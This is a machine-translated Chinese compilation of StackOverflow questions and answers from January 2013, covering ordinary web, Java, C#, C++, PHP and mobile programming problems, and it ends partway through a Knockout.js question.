# StackOverflow 问答 14469000-14469999

# javascript - 如果存在某个cookie，如何重定向用户

> ID：14469001
> 
> 赞同：-4
> 
> 时间：2013-01-22T22:11:05.970
> 
> 标签：javascript, html, css, cookies

> **可能重复：**
> [如果用户有 cookie javascript，如何重定向用户](https://stackoverflow.com/questions/14468535/how-to-redirect-user-if-they-have-a-cookie-javascript)

我正在创建一个网络应用程序，让您每天都有随机机会赢得一张 iTunes 卡。我已经完成了布局，我只需要制作它，这样用户就不能每天做超过一次。我知道 cookie 非常安全，他们可以清除他们的 cookie，但我仍然想使用它们，所以如果有人可以请给我创建一个在一天内过期的 cookie 的代码，以及一些检查 cookie 是否存在的更多 javascript 代码如果确实如此，则将它们重定向，这将不胜感激（我是javascript的菜鸟）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:16:20.047

如果可以使用 Jquery 你可以使用 Jquery 插件

设置一个cookie

```
$.cookie("example", "foo", { path: '/', expires: 1 }); 
```

得到一个饼干

```
alert( $.cookie("example") ); 
```

删除 cookie

```
$.cookie("example", null); 
```

这应该让你朝着正确的方向前进。

# java - 在文件中查找单词 - 如果文件包含将输出到控制台的路径

> ID：14469002
> 
> 赞同：-1
> 
> 时间：2013-01-22T22:11:08.583
> 
> 标签：java, file, search

我需要创建一个程序，它会做一些事情：

*   带参数：要查找的单词和要查找的路径
*   一个一个地在文件中查找给定的单词
*   如果在文件中找到该单词 -> 打印到控制台`filename`-`file path`

使用相同的解析算法遍历所有文件夹，直到有可能。

这是代码片段：

```
class SearchPhrase {
    // walk to root way
    public void walk(String path, String whatFind) throws IOException {
        File root = new File(path);
        File[] list = root.listFiles();
        for (File titleName : list) {
            if (titleName.isDirectory()) {
                walk(titleName.getAbsolutePath(), whatFind);
            } else {
                if (read(titleName.getName()).contains(whatFind)) {
                    System.out.println("File: " + titleName.getAbsoluteFile());
                }
            }
        }
    }

    // Read file as one line
    public static String read(String fileName) {
        StringBuilder strBuider = new StringBuilder();
        try {
            BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()));
            String strInput;
            while ((strInput = in.readLine()) != null) {
                strBuider.append(strInput);
                strBuider.append("\n");
            }
            in.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return strBuider.toString();
    }

    public static void main(String[] args) {

        SearchPhrase example = new SearchPhrase();
        try {
            example.walk("C:\\Documents and Settings\\User\\Java", "programm");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
} 
```

程序无法编译并出现以下错误：

`java.io.FileNotFoundException: C:\Documents and Settings\User\Java Hangman\Java\Anton\org.eclipse.jdt.core.prefs at java.io.FileInputStream.open(Native Method) at java.io.FileInputStream.<init>(FileInputStream.java:138) at java.io.FileReader.<init>(FileReader.java:72) at task.SearchPhrase.read(SearchPhrase.java:28) at task.SearchPhrase.walk(SearchPhrase.java:16) at task.SearchPhrase.walk(SearchPhrase.java:14) at task.SearchPhrase.main(SearchPhrase.java:48)`

***也许是解决这个问题的另一种方法？***

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:25:54.630

你在这里犯了几个错误..

```
[...]
  if (read(titleName.getName()).contains(whatFind)) {
                System.out.println("File: " + titleName.getAbsoluteFile());
      }
 [...] 
```

在上面的代码中，您将文件名传递给错误的读取方法。相反，您必须像这样传递文件名及其路径...

```
 if (read(**titleName.getAbsolutePath()**).contains(whatFind)) {
                System.out.println("File: " + titleName.getAbsoluteFile());
     } 
```

这里不需要 getAbsoluteFile()

```
 [...]

       BufferedReader in = new BufferedReader(new FileReader(new File(
                fileName).**getAbsoluteFile()**));
   [...] 
```

# tridion - 为什么我的 Tridion 二进制链接在使用 REL 时不显示？

> ID：14469008
> 
> 赞同：6
> 
> 时间：2013-01-22T22:11:33.973
> 
> 标签：tridion, tridion-2011, tridion-content-delivery

我正在生成一个 Tridion 二进制链接，如下所示：

1.  Razor TBB 为二进制链接生成链接解析器语法
2.  链路解析器 TBB 生成 TCDL。

输出作为输出类型 REL 的动态组件模板发布。发布目标指定 ASP.NET。

我在代理数据库的 COMPONENT_PRESENTATIONS 表中看到的输出如下：

```
<tcdl:Link type="binary" origin="tcm:0-0-0" 
           destination="tcm:34-669" templateURI="tcm:0-0-0" 
           linkAttributes="" textOnFail="true" addAnchor="" 
           variantId="">Document2</tcdl:Link> 
```

所以您至少希望看到文本“Document2”

如果我手工制作一个二进制链接控件`<tridion:BinaryLink..../>`，这工作得很好，但是上面列出的 TCDL 没有生成可见的输出。

可能出了什么问题？接下来我应该调查什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-23T04:29:40.763

我们注意到 Link Resolver TBB 没有为二进制类型生成正确大小写的相同行为。它被生成为`<tcdl:Link type="binary" ../>`而不是`<tcdl:Link type="Binary" ../>`（注意小写**b**而不是大写**B**，很难抓住）。REL TCDLTagRender 区分大小写，不解析小写 type:binary 的 tcdl:link，您将在 cd 日志文件中看到警告消息（假设您将日志级别设置为警告或调试）。

```
"WARN  LinkTagRenderer - Link type does not exist." 
```

解决方法是通过引入新的 TBB 将小写字母的输出替换`binary`为大写字母。`Binary`我们将此作为 TBB 的一部分包括在内，以解决任何多媒体链接（如 pdf、doc 等）的 RTF 字段二进制链接解析。

您在 TBB 中使用如下所示的二进制字符串替换小写二进制。

```
 string output = package.GetValue(Package.OutputName);
 output = output.Replace("type=\"binary\"", "type=\"Binary\"" ); 
```

# jquery - 需要帮助调整子菜单的边距和行高

> ID：14469010
> 
> 赞同：0
> 
> 时间：2013-01-22T22:11:44.560
> 
> 标签：jquery, html, css

我正在尝试执行以下操作：单击`PORTFOLIO` [http://jsfiddle.net/kuuwj/25/](http://jsfiddle.net/kuuwj/25/)，当您单击投资组合按钮子菜单时可以看到。但是我改变了颜色，所以你可以看到问题。一个问题是下一个按钮`ABOUT ME`将展开以保持相同的边距，并且它将与`portfolio-apps`类重叠。所以我想解决这个问题。以这样一种方式，`about me`将具有相同的边距，但从最后`section`一个`portfolio-apps`

# CSS

```
#navbar {
    list-style: none;
    z-index: 9;
    width: 255px;
    display: block;
    margin-top: 20px;
    margin-bottom: 20px;
    background: #ccc;
}
#navbar a {
    text-decoration: none; /* removes underline for links */
    text-transform: uppercase;
    font-size: 16px;
    display: block;
    background: #fff; /* for webbrowsers that does not support CSS3 */
    background: rgba(255,255,255,0.9);
    line-height: 50px; /* specifies the line height */
    padding: 0px 20px;
    color: rgb(68,68,68);
}

#navbar a:hover { /* Select a style of a link when the mouse over it */
    background: #bbb;
}

#navbar li {
    margin-bottom: 6px;
}

.button {
    position: relative;
    display: block;
    float: left;
    line-height: 35px;
    left: 75px;
    padding-right: 10px;
    text-align: right;
    font-size: 16px;
}

span {
    background: #EEE;   
} 
```

# HTML

```
<ul id="navbar">
    <li><a href="#home" id="nav-home">Home</a></li>
    <li><a href="#portfolio" id="nav-portfolio">Portfolio</a>
        <div class="portfolio-apps">
         <section id="website">
            <span class="button">AAAAAAAAAAAAAAAAAAAAAA</span>
         </section>
         <section id="gterminal">
            <span class="button">BBBBBBBBBBBBBBBBBBBBBB</span>
         </section>
         <section>
            <span class="button">CCCCCCCCCCCCCCCCCCCCCC</span>
         </section>
        </div>
    </li>
    <li><a href="#about" id="nav-about">About Me</a></li>
    <li><a href="#contact" id="nav-contact">Contact</a></li>
   </ul> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:17:20.680

你必须清除你的花车 -[**演示**](http://jsfiddle.net/kuuwj/30/)

```
.clearfix:after {
    content: ".";
    display: block;
    clear: both;
    visibility: hidden;
    line-height: 0;
    height: 0;
}

.clearfix {
    display: inline-block;
}

html[xmlns] .clearfix {
    display: block;
}

* html .clearfix {
    height: 1%;
} 
```

# javascript - 无法从 facebook 获取登录状态

> ID：14469011
> 
> 赞同：3
> 
> 时间：2013-01-22T22:11:46.593
> 
> 标签：javascript, facebook, facebook-graph-api, facebook-javascript-sdk, facebook-authentication

我是 facebook 应用程序开发的新手。我正在尝试从 facebook 获取访问令牌。为此，我正在尝试使用以下代码检查我的登录状态

```
<html>
<body>
 <fb:login-button></fb:login-button>
<div id="fb-root"></div>
<script src="http://connect.facebook.net/en_US/all.js"></script>
<script type="text/javascript"> 
window.fbAsyncInit = function() {
    FB.init({appId: 'appId', status: true, cookie: true, xfbml: true});
    alert('page 1');
    FB.getLoginStatus(function(response) {
      if (response.status === 'connected') {
        alert('Page 2');
        // connected
      } else if (response.status === 'not_authorized') {
        // not_authorized
      } else {
        // not_logged_in
      }
     });
}
</script>
</body>
</html> 
```

当我执行上面的代码时，它会显示一个登录按钮，我可以在其中成功登录。我可以收到“第 1 页”警报，但无法收到“第 2 页”警报。我不知道这段代码有什么问题。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:56:54.243

`Sanbox mode`检查您是否已在应用程序中启用。如果是，并且您当前没有以具有此应用程序的管理员或开发人员角色的用户身份登录，则会发生这种情况。尝试禁用沙盒一段时间后它是否会起作用。检查这个问题的答案 - [https://stackoverflow.com/a/8485361/1816426](https://stackoverflow.com/a/8485361/1816426)

当然，我假设这`appId: 'appId'`部分只是一个示例，您的代码中的应用程序 ID 是从应用程序的设置中获取的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:42:03.907

一些让你前进的提示：

1）检查您的 appID 是否有效（我希望您没有按字面意思写`appId`，并且实际上插入了您注册的 appID）

`FB.init({appId: 'appId', status: true, cookie: true, xfbml: true});`

2）尝试通过执行以下操作查看实际响应：

`alert(response);`

*此处说明了响应的详细信息：[https ://developers.facebook.com/docs/reference/javascript/FB.getLoginStatus/](https://developers.facebook.com/docs/reference/javascript/FB.getLoginStatus/)

但我的猜测是您的应用程序没有正确注册，或者您没有在您的`appID`字段中插入正确的 appID。通常情况就是这样。

# vb.net - 表单加载接受计划任务的参数

> ID：14469012
> 
> 赞同：0
> 
> 时间：2013-01-22T22:11:47.847
> 
> 标签：vb.net, design-patterns

请看下面的代码：

```
Private Sub Form1_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
    Dim objPerson As New clsPerson
    Dim strCommandLine() As String
    strCommandLine = System.Environment.GetCommandLineArgs()

    If strCommandLine(1) = "Test1" Then
        objPerson.Test1()
    ElseIf strCommandLine(1) = "Test2" Then
        objPerson.Test2()
    ElseIf strCommandLine(1) = "Test3" Then
        objPerson.Test3()
    End If
End Sub 
```

根据计划任务是否传递参数`Test1`,`Test2`或来执行三种方法之一`Test3`。这显然不是很好的设计。

有没有设计模式可以满足这个要求？可能类似于 Model View Presenter 模式。这是一个没有用户界面（最终用户可以与之交互）的 Windows 窗体应用程序。

# http - 什么需要不同的电子邮件协议？

> ID：14469014
> 
> 赞同：2
> 
> 时间：2013-01-22T22:11:50.793
> 
> 标签：http, email, smtp

HTTP 在哪些方面不适合电子邮件？IMAP 的状态性如何（例如）有利于客户开发？

除了历史和向后兼容性原因之外，将它们分开的真正理由是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-23T07:56:30.940

SMTP、IMAP 和 HTTP 是专门的应用程序级协议。如果有一个通用的应用程序级协议，所有这些都可以继承，你可以有用地重构一些东西，但由于情况并非如此，将其他协议嵌入现有协议之一是不值得的，而且几乎不会简化事情。

就像现在一样，历史和向后兼容性不仅仅是一种文化遗产，它也是为每个协议定义应用程序特定功能的一个漫长而复杂的过程。SMTP 是存储转发的，它引入了对审计标头的需求（`Received:`等人）。IMAP 是为并发访问数据存储而设计的，因此有必要引入状态（您是谁，您在哪里被授权连接，您连接到哪个文件夹，您已经看到、阅读或删除了什么） . HTTP 从根本上说是一个拉协议（下拉网页），该`POST`工具带有许多特定于 CGI 协议和 HTTP 整体内容模型的功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:16:05.330

SMTP 是一种识别发件人和收件人以发送单个邮件消息的协议，每个邮件服务器都接受（或不接受）要转发的邮件，最终到达目的地。HTTP 意味着任何人都可以连接到服务器并查看（大部分相同的）内容。它们有着根本的不同，因此使用不同的协议很有意义。

# replace - 在其他编辑器中查找和替换/更新链接，如 Dreamweaver

> ID：14469015
> 
> 赞同：1
> 
> 时间：2013-01-22T22:11:58.520
> 
> 标签：replace, sublimetext2, dreamweaver, text-editor, macrabbit-espresso

我一直在慢慢摆脱 Dreamweaver 并使用其他编辑器，如 SublimeText 和 Espresso。但是这些编辑器缺少两个我仍然需要使用 Dreamweaver 的功能：

1.) 在整个当前本地站点内查找和替换。

2.) 当页面保存在另一个目录中时更新链接。例如，如果您重命名或重新保存在另一个目录中打开的文件，Dreamweaver 将要求您更新链接。这将确保如果文件被移动或保存到另一个目录，它将更新 HTML 中用于样式表、图像、导航等的任何链接。

是否知道任何其他应用程序或工具可以完成这些操作而无需打开 Dreamweaver？

非常感谢任何输入。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:28:01.107

Sublime Text 插件['Side Bar Enhancements'](https://github.com/titoBouzout/SideBarEnhancements)具有搜索/替换整个项目的功能。不处理跨文件的更新链接（我发现）

PHPStorm 可以处理第二个问题。

# php - 如何循环通过 HTML5 多个文件上传？

> ID：14469018
> 
> 赞同：2
> 
> 时间：2013-01-22T22:12:11.337
> 
> 标签：php, html

我使用下面的表格将多张图片上传到我的服务器。

```
<form name="addimageForm" id="addimageForm" method="post" action="" enctype="multipart/form-data">              
    Gallery Image: 
    <input name="image_name[]" type="file" id="image_name" multiple="true">
    <input type="submit" name="addCatImage"/>
</form> 
```

但我很困惑我应该如何遍历它，以便我可以在我的数据库中插入多个图像。我使用了下面的代码，当我运行它时，即使我选择了一个图像，我的表中也会插入 4 行。我认为它正在插入所有数组字段（名称、大小、tmp_name）。我该如何解决这个问题？

```
foreach ($_FILES[image_name] as $file) {
    $access->uploadSubCatImages();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:18:57.070

PHP 使属性本身成为数组。是的，我不知道是谁决定的。

```
// PHP does this:
$_FILES['image_name']['name'] = array('file1', 'file2', 'file'3);
$_FILES['image_name']['type'] = array('...', ...); 
```

[http://www.php.net/manual/en/features.file-upload.multiple.php](http://www.php.net/manual/en/features.file-upload.multiple.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:15:18.337

首先，$_FILES 数组的索引是一个**字符串**。虽然 PHP 会“吃掉”它并抛出一个 E_NOTICE，但你不应该这样做。改为使用`'image_name'`。（注意引号）

此外，数组结构可能与您预期的不同。以下将通过 filen ames 循环，例如：

```
foreach ($_FILES['image_name']['name'] as $filename) {
    // do work here
} 
```

请参阅文档[`$_FILES`](http://php.net/manual/en/reserved.variables.files.php)，尤其是[此](http://php.net/manual/en/features.file-upload.multiple.php)文档页面。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:22:28.377

$_FILES 是多维的。使用您使用的语法，文件名可以在

```
$_FILES['image_name']['name'][0] # for the first one
$_FILES['image_name']['name'][1] # for the second one 
```

等等。这是参考[上传多个文件的链接](http://php.net/manual/en/features.file-upload.multiple.php)

# grails - Grails 和 Cloudbees

> ID：14469020
> 
> 赞同：1
> 
> 时间：2013-01-22T22:12:23.287
> 
> 标签：grails, cloudbees

我正在关注Grails 和 Cloudbees 上的本[教程，它说：](http://developer.cloudbees.com/bin/view/RUN/Grails)

“要从您的应用程序本地使用 CloudBees 数据库，您首先需要将 CloudBees SDK 的 appserver.jar 文件添加到您的 grails 类路径中”

有谁知道这是什么`appserver.jar`？我在哪里可以找到它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-31T00:14:12.623

是的，正如评论中提到的 - 您可以从您下载的 SDK 中获取该 jar 文件。

但是，如前所述，直接使用 mysql 驱动程序是完美的（并且可能更好）。

在 cloudbees 上运行时，您可以使用 bees db:bind SDK 命令将您的应用程序绑定到数据库 - 以便在运行时注入正确的数据库。

# ogre - 使用 Ogre OctreeSceneManager 或通用场景管理器

> ID：14469026
> 
> 赞同：1
> 
> 时间：2013-01-22T22:12:46.203
> 
> 标签：ogre

有人在 Ogre 中使用过 OctreeSceneManager 吗？渲染比通用场景管理器更快吗？我使用 OpenGL 渲染系统。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-02T16:44:45.370

（迟到总比不到好 ;-） ）

引用[Ogre Wiki](http://www.ogre3d.org/tikiwiki/SceneManagersFAQ#Octree_Scene_Manager)，一个 OSM（八叉树场景管理器）

> 使用八叉树分割场景并在大多数场景中表现良好，除了那些依赖于重度遮挡的场景。

现在，GSM（通用场景管理器）和 OSM 之间有一个很大的区别：
GSM 依赖于开发人员来构建场景节点层次结构，而 OSM 在后台自动构建所有场景节点的八叉树。
这意味着如果您要将所有场景节点添加到根节点，则 GSM 会慢得多¹。
两者的用法保持不变，您仍然可以随意订购节点。

当您进行大量平截头体剔除或（射线）场景查询时，您可能希望使用 OSM，因为它会执行得更好²（但请记住不要将所有场景节点聚集在根节点下）。

除非您有一个依赖于严重遮挡的场景，或者您必须将所有场景节点直接添加到根节点下，否则我更喜欢 OSM。

¹ - [GSM 与 OSM](http://www.ogre3d.org/forums/viewtopic.php?f=1&t=70253#p458544)
² -[如何使用 OSM](http://www.ogre3d.org/forums/viewtopic.php?f=2&t=73227#p472710)

# c++ - 如何制作单例类BlackBerry 10

> ID：14469039
> 
> 赞同：0
> 
> 时间：2013-01-22T22:13:29.827
> 
> 标签：c++, blackberry-10

假设我们必须在应用程序的整个生命周期中使用一个类的单个对象。在 BlackBerry 10 中，是否可以声明一个全局对象，它可以在程序内部的任何位置使用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T02:27:09.183

您可以这样做，但更好的方法可能是使用设计为单例的类：

单例.hpp

```
class Singleton {
private:
    Singleton();

public:
    virtual ~Singleton();
    static Singleton &instance();

    int getMemberField() { return m_memberField; }
    void setMemberField(int mf) { m_memberField = mf; }

private:
    static Singleton    *p_instance;

    int                 m_memberField;
}; 
```

单例.cpp

```
Singleton*    Singleton::p_instance = NULL;

Singleton::Singleton() {
    p_instance = this;
    m_memberField = 0;
}

Singleton::~Singleton() {
    p_instance = NULL;
}

Singleton&    Singleton::instance() {
    if (p_instance == NULL) {
        p_instance = new Singleton();
    }
    return *p_instance;
} 
```

在应用程序代码中

```
Singleton::instance().setMemberField(25);
Singleton::instance().getMemberField(); 
```

这样做的真正好处是单例会照顾自己的全局指针。

# c# - 使用泛型类型约束的继承

> ID：14469040
> 
> 赞同：0
> 
> 时间：2013-01-22T22:13:31.087
> 
> 标签：c#, .net, generics, inheritance

如何正确继承具有泛型类型和泛型类型约束（在哪里）的类（另一个类和接口）？

```
class A { }
class B { }
interface I { }

class C<T> where T : A, B, I { } 
```

在此示例中，A、B 和 I 被视为 T 的基础。在 C# 中不能继承 2 个类。但我希望 A 是泛型类型 T 的基类，而 B/I 是 C 的基类/接口。如何做到这一点？

一旦我对泛型类型使用 where 约束，我就不能再派生我的类 C

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T22:21:06.207

```
public class A
    {
    }
   public class B
   {
   }

   public interface I
   {
   }

   public class C<T> : B, I where T : A
   {
   } 
```

# javascript - 初始化 DHTMX 调度程序

> ID：14469044
> 
> 赞同：0
> 
> 时间：2013-01-22T22:13:40.640
> 
> 标签：javascript, html, initialization, dhtmlx

我正在我的应用程序上测试 DHTMLXscheduler 模块。[我遵循了在http://docs.dhtmlx.com/doku.php?id=dhtmlxscheduler:how_to_start](http://docs.dhtmlx.com/doku.php?id=dhtmlxscheduler:how_to_start)上解释设置模块的所有步骤，但无法让它工作。

我已经在我的头文件中实现了 js 和 css 并实现了所有必要的代码。运行我的应用程序后，我的控制台中出现了一个空白屏幕，没有任何错误。

有人有过这样的经历吗？

我用来初始化的代码与他们网页上显示的代码完全相同：

```
<script type="text/javascript">
scheduler.init('scheduler',null,"week");
</script>
<div id="content">
<div id="scheduler" class="dhx_cal_container" style='width:100%; height:100%;'>
    <div class="dhx_cal_navline">
        <div class="dhx_cal_prev_button">&nbsp;</div>
        <div class="dhx_cal_next_button">&nbsp;</div>
        <div class="dhx_cal_today_button"></div>
        <div class="dhx_cal_date"></div>
        <div class="dhx_cal_tab" name="day_tab" style="right:204px;"></div>
        <div class="dhx_cal_tab" name="week_tab" style="right:140px;"></div>
        <div class="dhx_cal_tab" name="month_tab" style="right:76px;"></div>
    </div>
    <div class="dhx_cal_header">
    </div>
    <div class="dhx_cal_data">
    </div>      
</div> 
```

我还尝试在导致相同结果的 html 内容之后调用 init 方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T10:12:03.630

问题已经解决了。我不得不增加内部 div #content 的高度。

# android - Unity3D Android Java 插件：在 UnityPlayer Activity 上添加了按钮-> 触摸不起作用

> ID：14469045
> 
> 赞同：1
> 
> 时间：2013-01-22T22:13:46.000
> 
> 标签：android, android-layout, android-widget, unity3d

我正在将 Unity3D 绑定到 Java SDK。该 Java SDK 向当前 Activity (UnityPlayer.currentActivity) 添加了一个 View (RelativeLayout)，其中包含一个 android.widget.Button。

视图完美显示，但当用户触摸/点击按钮时，不会调用按钮的 OnClickListener.onClick 方法。

使用以下代码添加带有按钮的视图：

```
UnityPlayer.currentActivity.addContentView(view, params); 
```

我认为 Unity 可能会捕获所有用户触摸事件。是否可以转发它们以便 Button 可以触发 onClick ？还有其他方法吗？

在此先感谢您的帮助。

编辑：我试图在我的清单中添加 com.unity3d.player.UnityPlayerNativeActivity ：

`<meta-data android:name="unityplayer.ForwardNativeEventsToDalvik" android:value="true" />`

但到目前为止还没有结果:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-09T12:25:33.077

您的假设是正确的，Unity 正在捕捉输入。如果您想捕获输入而不是 Unity - 您必须将视图放入单独的窗口（对话框），或创建自己的 Activity。这两个选项都创建了自己的输入循环，因此覆盖了 Unity 循环。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-16T07:23:43.883

在我的一个项目中尝试解决这个问题时，我确实找到了一种解决方法。

解决方案：

1.  ProxyActivity 是第一个出现的活动。这将打开 Activity 或 NativeActivity，具体取决于 android 版本。
2.  确保显示了 Activiy（而不是 NativeActivity）。在 ProxyActivity 中更改的代码片段：

> 班级活动 = Class.forName(classNames[0]);

^^ 总是强制它打开扩展 Activity 而不是 Native 的类。

# javascript - 图外的 JQPlot 图例

> ID：14469046
> 
> 赞同：8
> 
> 时间：2013-01-22T22:13:50.733
> 
> 标签：javascript, html, position, jqplot, legend

我正在使用 JQPlot，我在一个 HTML 页面上有很多图表。每个图表都有相同的图例。

我的问题是：是否可以完全在图形之外显示一个图例，在 HTML 页面或它自己的 div 中具有自己的位置？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-11-18T12:29:03.610

```
legend:{ 
                show:true,
                    renderer: $.jqplot.EnhancedLegendRenderer,
                    location: 's' ,
                    placement : "outside",
                    marginTop : "30px",
                    rendererOptions: {
                        numberRows: 1
                    }
                 }, 
```

您可以像上面的代码一样使用放置：“外部”。您可以使用 marginTop,marginBottom,marginRight,marginLeft 属性来移动它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-24T18:10:34.323

也许你可以隐藏第 2 到最后一张图的图例，如下所示：

```
legend: { show:false} 
```

在第一张图中，输入如下内容：

```
 legend:{
        show:true, 
        placement: 'outside', 
        rendererOptions: {
            numberRows: 1
        }, 
        location:'n' 
```

这样，您将只在图表顶部显示一个图例。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-23T00:20:51.750

你在找`title`吗？您可以设置 .jqplot-title 的样式以显示不同。默认情况下，它显示在图表之外。

```
$.jqplot('chartdiv',  [[[1, 2],[3,5.12],[5,13.1],[7,33.6],[9,85.9],[11,219.9]]],
{ title:'Exponential Line',
  axes:{yaxis:{min:-10, max:240}},
  series:[{color:'#5FAB78'}]
}); 
```

您也可以重新设计图例。[请](http://www.jqplot.com/docs/files/jqPlotCssStyling-txt.html)参阅`table.jqplot-table-legend`http://www.jqplot.com/docs/files/jqPlotCssStyling-txt.html

# android - 如何测试 Android phonegap-app 的性能

> ID：14469047
> 
> 赞同：3
> 
> 时间：2013-01-22T22:13:55.063
> 
> 标签：android, cordova, jquery-mobile, mgwt

我用[phonegap](http://phonegap.com/)和[mgwt](http://www.m-gwt.com/)做了一个不错的应用程序。

现在我想用 jquery mobile 做同样的应用程序，并将 mgwt 应用程序与 jquery 移动应用程序进行比较。

我想比较这两个应用程序的大小和性能。

例如从一个视图（或侧面）到下一个视图（侧面）的变化速度。例如，这可以用秒表测试速度吗？

我怎么能做这个测试？

我需要一部安卓手机还是在桌面浏览器中测试它更好？如何测试性能以及需要哪些工具？

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T06:55:19.753

您可以使用的一个选项是[Traceview](http://developer.android.com/guide/developing/debugging/debugging-tracing.html "跟踪视图")。在这篇[博](http://blog.pamelafox.org/2011/10/phonegap-loading-performance-in-ios.html "iOS 中的 PhoneGap 加载性能")文中，您可以看到一种测量 phonegap 应用程序中事件时间的方法。

我希望它有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T11:20:40.593

您可以使用 Browsers DeveloperTools（Firebug、Chrome DevTools、Safari Web Inspector）来衡量不同应用程序的性能。

使用 Safaris Web Inspector，可以测量在真实设备上运行的 Phonegap 应用程序的性能。[参见 Safari Docs](http://developer.apple.com/library/safari/#documentation/AppleApplications/Reference/SafariWebContent/DebuggingSafarioniPhoneContent/DebuggingSafarioniPhoneContent.html#//apple_ref/doc/uid/TP40006515)它可以连接到 iOS 设备上的浏览器，也可以连接到应用程序使用的 WebViews，例如当它使用 PhoneGap 时。

对于 Android，您可以使用[Weinre](http://people.apache.org/~pmuellr/weinre/docs/latest/)为在设备上运行的应用程序获取 Web 开发工具。

Web 开发者工具提供了很多可能性来查看您的应用程序，例如检查您的 DOM 元素、资源、网络流量、控制台以及分析您的应用程序。您可以调用`console.profile()`以开始分析并以`console.profileEnd()`. 因此，这将是一种测量函数执行时间的简单方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-23T16:49:16.173

如果是 jQuery Mobile 并且只有 jQuery Mobile，您可以使用这个 js 脚本：[https ://github.com/jquery/jquery-mobile/blob/master/tools/page-change-time.js](https://github.com/jquery/jquery-mobile/blob/master/tools/page-change-time.js)

在我另一篇文章的底部：[https](https://stackoverflow.com/a/14469041/1848600) ://stackoverflow.com/a/14469041/1848600你会发现如何使用它。

# jquery - JQuery fire an event when a select control's source/options change

> ID：14469050
> 
> 赞同：3
> 
> 时间：2013-01-22T22:14:00.137
> 
> 标签：jquery, select, binding, event-handling, knockout.js

我有一个场景，我可以访问 Select 控件（组合框），并且我需要一种在其源/选项列表更改时触发事件的方法。

例如，如果我有一个选择控件，它首先将 Option1 和 Option2 作为其选项，我需要一种在选项更改为 Option1、Option3、Option4 时触发事件的方法。我不在乎是否添加、删除了新选项，或者是否新添加了所有项目。All I want is a event handler when the options of a select control change.

一位朋友建议在将 Option 元素添加到 DOM 时更改 DOM，但我不确定这是因为每次页面中的任何 dom 元素更改时都会触发 DOM 更改。

更新：很抱歉造成混乱。我不是在寻找选择更改。我正在寻找实际选项列表的更改。

我正在使用 Knockoutjs，并且我将一个可观察数组作为选项绑定到一个选择控件。knockoutjs 的 applybindings 需要几毫秒，然后将 observable 数组设置为 Select 控件的选项。我需要挂钩到该更改事件，以便我可以根据新的选项集做一些事情。

在有人说为什么不处理可观察数组的更改之前，我无法在我拥有事件处理程序的位置访问该可观察数组。

更新 2：

这里有更多信息。

我有一个选择控件，它有一个自定义绑定，就像这样。

```
 @Html.KnockOutDropDownListFor(rule => ruleTemplate.RuleReserveWordId, new List<SelectListItem>(), null,
              new {data_bind = "options: $root.RuleReserveWords, optionsText:'Name', optionsValue:'RuleReserveWordId', typeaheadCombobox: {sizeClass : 'input-mini'}" } 
```

@Html.KnockoutDropDownlIstFor 是我编写的一个自定义 ASP.NET MVC 帮助程序，用于创建一个具有所有适当剔除相关属性的选择控件。它最终将一个选择控件呈现给 DOM。

我想要的选择控件应该是一个自动完成/预先输入的组合框。由于我们使用的是引导程序，因此我们使用了来自此处的引导程序插件

[https://github.com/danielfarrell/bootstrap-combobox](https://github.com/danielfarrell/bootstrap-combobox)

在我的自定义绑定中，我尝试调用插件。

selectControl.customcombobox();

该插件基本上在选择控件上创建了一个输入控件并隐藏了选择控件。同时，它尝试访问选择控件的选项，并在用户开始键入时设置为输入控件的下拉菜单。

问题是由于我很早就调用了ko.applybindings（因为我认为无论我在哪里调用applybindings，一旦绑定都设置好，UI会自动更新），到调用插件时，绑定还没有边界。因此，选择控件没有设置实际的选项。因此，输入控件没有设置任何值。

如果我在几毫秒后调用插件，它会在绑定完成时工作。但这是有风险的，因为如果服务器调用时间更长，事情就会再次中断。

这就是为什么我想看看是否有办法找到

1）当使用jquery更新选择控件选项时（从没有选项到绑定后的某些选项）。没有办法直接做到这一点。有些人建议使用更新的 DOM，但它不适用于所有浏览器并且已被弃用。

或者

2) 在敲除中找到一种方法来找出绑定到选择控件的实际 observablearray 何时更新（在此示例中为 RuleReserveWords）。这将是我的首选方式。

我不能使用“更新”，因为每次更改选择控件中选择的值时都会调用它。这不是我想要的。

只要我知道何时更新选项，我就有办法更新选项。

我尝试的另一种方法是这样。在调用插件之前，我尝试添加选项以自己选择控制。DOM 渲染得很好，但不知何故，在绑定后没有立即设置选择。

```
ko.bindingHandlers.typeaheadCombobox = {
    init: function (element, valueAccessor, allBindingsAccessor)
    {
        var valueUnwrapped = ko.utils.unwrapObservable(valueAccessor());
        var selectControl = $(element);
        var options = allBindingsAccessor().options;
